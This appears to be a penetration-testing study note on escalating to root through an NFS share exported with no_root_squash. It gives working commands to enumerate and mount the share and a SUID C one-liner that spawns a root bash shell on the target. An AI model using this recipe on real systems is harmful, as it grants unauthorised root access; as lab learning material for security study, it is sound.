#### Mounting
Target:
```bash - target
cat /etc/exports
```

![[Pasted image 20221115140352.png]]

Notice how the /tmp directory is set to no_root_squash.

Kali:
```bash - kali
showmount -e $TARGET
```

![[Pasted image 20221110090529.png]]
Similar Nmap script:

```bash
nmap –sV –script=nfs-showmount $TARGET
```

```bash - kali
mkdir /tmp/mountme
```

```bash - kali
sudo mount -o rw,vers=2 $TARGET:/tmp /tmp/mountme
```

```bash - kali
ls /tmp/mountme
```

#### Root Squashing
```bash - kali
cd /tmp/mountme
```

```bash - kali
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > x.c
```

```bash - kali
sudo gcc x.c -o x
```

```bash - kali
sudo chmod +s x
```

Target:
```bash - target
cd /tmp
```

```bash - target
./x
```

![[Pasted image 20220220171150.png]]

